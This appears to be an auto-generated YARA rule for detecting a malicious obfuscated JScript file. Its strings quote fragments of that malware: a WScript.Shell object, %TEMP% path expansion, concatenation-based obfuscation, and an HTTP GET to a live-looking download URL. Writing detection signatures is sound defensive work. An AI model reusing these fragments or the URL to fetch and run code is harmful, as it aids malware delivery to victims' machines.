rule sig_20160427_65a390a742a2c9d4a80711c058b3ec7a {
  meta:
    description = "datamaliciousorder - file 20160427_65a390a742a2c9d4a80711c058b3ec7a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b31168c5cb3138bce6cc5dd7c85ceaef3902b5f59e01d32bef7c177c548b7d8b"

  strings:
    $s1  = "BrwkzZjthv[AcvhsXlesx](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function RpnqdAwxuq() {return BkmwpVepwk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qExHMOh" ascii
    $s3  = "function RpnqdAwxuq() {return BkmwpVepwk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"qExHMOh" ascii
    $s4  = "function UphogEmavf(YrupeHfcbp, LrccrIegud){XmmudHenfn = XmmudHenfn * 1; return YrupeHfcbp - LrccrIegud;};" fullword ascii
    $s5  = "var BkmwpVepwk = function NgseqYbsko() {return YbbxbWluoq[RnbvsSgbbl](\"WScript\"+\".Shell\");}(), SkaafTibuo = 11;" fullword ascii
    $s6  = "var YbbxbWluoq = this[\"WScript\"];" fullword ascii
    $s7  = "function VnzlpDorvv(){return KxiptUzxir + \"\";};" fullword ascii
    $s8  = "if (BrwkzZjthv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function EjqpwIvhbo() {return ((NpabzUvnim == true) && (NpabzUvnim == HysboJyyjs)) ? 1 : XmmudHenfn;};" fullword ascii
    $s10 = "var OlqpaBrnkn = false;" fullword ascii
    $s11 = "}while (CydvgQwhes);" fullword ascii
    $s12 = "function KffgsHwogw(KlrvnQhrxv) {var InnaxLqrll = (1, 2, 3, 4, 5, KlrvnQhrxv); return InnaxLqrll;};" fullword ascii
    $s13 = "var QwnrhPzmab = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function ApvmmMpxaq()" fullword ascii
    $s15 = "return UphogEmavf(InkyhIwqmj, ArqefWdmxq);" fullword ascii
    $s16 = "var HysboJyyjs = false;" fullword ascii
    $s17 = "function QiuohAahjn(){return 23;};" fullword ascii
    $s18 = "function WftebNhkgt(){return RnbvsSgbbl;};" fullword ascii
    $s19 = "NpabzUvnim = true; " fullword ascii
    $s20 = "HysboJyyjs = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}